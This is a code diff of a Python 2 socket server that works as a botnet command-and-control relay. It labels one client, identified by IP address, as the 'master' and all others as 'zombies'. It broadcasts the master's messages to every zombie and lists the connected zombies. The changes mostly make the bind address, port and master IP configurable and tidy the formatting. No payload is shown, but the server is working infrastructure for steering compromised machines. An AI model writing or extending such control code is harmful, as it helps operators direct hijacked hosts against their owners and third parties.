@@ -2,23 +2,25 @@
 import socket
 import thread
 import sys
-import re
 class SocketServer(socket.socket):
     clients = []
-    master_ip = ""
+    master_ip = "192.168.25.11"
     def __init__(self):
 
         # Set hostname and port as argument or default
-        if(len(sys.argv) < 2) :
-            master_ip = "192.168.25.11"
-        else:
-            master_ip = sys.argv[1]
+        if len(sys.argv) == 4:
+            master_ip = sys.argv[3]
 
         socket.socket.__init__(self)
-
+        if len(sys.argv) < 3:
+            local_ip = "127.0.0.1"
+            local_port = 4545
+        else:
+            local_ip = sys.argv[1]
+            local_port = int(sys.argv[2])
         # Socket config
         self.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-        self.bind(('192.168.25.3', 4545))
+        self.bind((local_ip, local_port))
         self.listen(5)
 
     def run(self):
@@ -32,7 +34,7 @@ class SocketServer(socket.socket):
         finally:
             print "Server closed"
             self.broadcast("stop")
-            for client,role in self.clients:
+            for client, role in self.clients:
                 client.close()
             self.close()
 
@@ -40,14 +42,14 @@ class SocketServer(socket.socket):
         while 1:
             (clientsocket, address) = self.accept()
             #Adding client to clients list
-            if address[0] == "192.168.25.11" or address[0] == "127.0.0.1":
+            if address[0] == self.master_ip:
                 role = "master"
             else:
                 role = "zombie"
 
-            self.clients.append(tuple((clientsocket,role)))
+            self.clients.append(tuple((clientsocket, role)))
             #Client Connected
-            self.onopen(clientsocket,address,role)
+            self.onopen(clientsocket, address, role)
             #Receiving data from client
             thread.start_new_thread(self.recieve, (clientsocket,))
 
@@ -68,7 +70,7 @@ class SocketServer(socket.socket):
         #Removing client from clients list
         self.clients.remove(i)
         #Client Disconnected
-        self.onclose(client,client.getpeername(),client_role)
+        self.onclose(client, client.getpeername(), client_role)
         #Closing connection with client
         client.close()
         #Closing thread
@@ -76,13 +78,13 @@ class SocketServer(socket.socket):
 
     def broadcast(self, message):
         #Sending message to all zombie clients
-        for client,role in self.clients:
+        for client, role in self.clients:
             if role != "master":
                 client.send(message+"\n")
 
     def multicast(self,message,sender):
         #Sending message to all clients but sender
-        for client,role in self.clients:
+        for client, role in self.clients:
             if client != sender:
                 client.send(message)
 
@@ -142,7 +144,7 @@ class BasicChatServer(SocketServer):
         #List all clients currently connected
         list = "\n===== List of zombies connected =====\n\n"
         i = 0
-        for client,role in self.clients:
+        for client, role in self.clients:
             if role == "zombie":
                 list += "Zombie #" + str(i) + " - at " + client.getpeername()[0] + " port " + str(client.getpeername()[1]) + "\n"
             i += 1
